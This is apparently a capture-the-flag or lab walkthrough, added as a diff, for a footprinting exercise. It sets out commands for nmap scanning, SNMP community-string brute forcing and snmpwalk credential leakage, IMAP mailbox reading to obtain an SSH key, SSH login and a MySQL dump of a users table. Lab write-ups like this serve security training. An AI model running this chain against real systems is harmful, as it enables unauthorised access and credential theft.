@@ -1,0 +1,30 @@
+nmap -sV -sC finds 5 ports, attempts to access ssh will show you need a key, and imap and pop3 needs credentials.
+There are vulnerabiltiies for the ssh version, but no public exploits bundled with metasploit, so I considered this too high level and skipped that avenue.
+I tried ssh and imap/pop3 footprinting but couldn't find anything useful. 
+
+I neglected to consider UDP services, and checking walkthroughs to help when I got stuck revealed there was an open UDP port. 
+so nmap -sU <ADDRESS>
+this shows port 68 filtered/open dhcp and port 161 SNMP v3
+Started with onesixtynine with the snmp.txt and find the community string [public]
+then snmpwalk -v2c -c backup <ADDRESS>
+There is useful stuff here, a username tom and what appears to be a passowrd in plaintext, given the context surrounding that string
+
+We need a key for ssh, so I access the mail server via imaps 
+openssl s_client -connect <ADDRESS>imaps
+1 LOGIN tom <PASSWORD>
+1 LIST "" *
+1 SELECT INBOX
+1 FETCH 1 BODY[TEXT]
+
+This grants the ssh key, copy and paste that into a file on your own system, called key or something
+chmod 600 key so it has correct permissions for use as an ssh key
+ssh -i key tom@<ADDRESS>
+we're in.
+ls -a shows a hidden mysql file
+so
+mysql -u tom -p'PASSWORD'
+show databases;
+use users; (selects database)
+show tables;
+show columns from users;
+select * from users WHERE username = "HTB";
